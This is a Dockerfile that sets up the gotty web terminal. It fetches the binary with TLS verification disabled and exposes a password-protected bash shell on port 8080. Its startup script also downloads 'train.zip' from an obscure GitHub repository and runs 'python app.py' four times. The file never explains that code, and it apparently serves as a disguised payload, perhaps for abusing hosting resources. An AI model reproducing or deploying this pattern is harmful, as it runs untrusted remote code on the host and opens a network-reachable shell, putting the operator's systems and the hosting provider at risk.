FROM python:3.10

ENV LANG en_US.UTF-8
ENV LANGUAGE en_US:en
ENV GOTTY_TAG_VER v1.5.0

RUN apt-get -y update && \
    apt-get install -y curl && \
    curl -sLk https://github.com/sorenisanerd/gotty/releases/download/${GOTTY_TAG_VER}/gotty_${GOTTY_TAG_VER}_linux_amd64.tar.gz \
    | tar xzC /usr/local/bin 

RUN echo 'USER="ADMIN"' >> gotty.sh
RUN echo 'PASS="${TTY_PASSWORD:-$(head -c 25 /dev/urandom | base64)}"' >> gotty.sh
RUN echo 'echo USER: $USER' >> gotty.sh
RUN echo 'echo PASSWORD: $PASS' >> gotty.sh
RUN echo 'apt-get update;apt-get install wget curl -y' >> gotty.sh
RUN echo 'wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py' >> gotty.sh
RUN echo 'gotty --credential "${USER}:${PASS}" --port 8080 --reconnect -w bash' >> gotty.sh
RUN chmod +x gotty.sh

EXPOSE 8080

ENTRYPOINT /gotty.sh
